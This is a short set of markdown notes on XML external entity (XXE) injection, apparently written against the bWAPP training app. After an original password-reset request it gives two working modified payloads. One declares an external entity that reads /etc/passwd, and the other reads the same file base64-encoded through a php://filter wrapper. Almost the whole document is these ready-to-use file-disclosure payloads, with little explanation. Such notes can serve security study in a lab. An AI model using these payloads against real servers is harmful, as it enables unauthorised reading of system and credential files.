# XXE

```XML
ORIGINAL REQUEST:
<reset>
    <login>bee</login>
    <secret>Any bugs?</secret>
</reset>

MODIFIED REQUEST:
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset>
    <login>&xxe;</login>
    <secret>Any bugs?</secret>
</reset>

* This is for extracting data from server
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<reset>
    <login>&example;</login>
    <secret>Any bugs?</secret>
</reset>
```
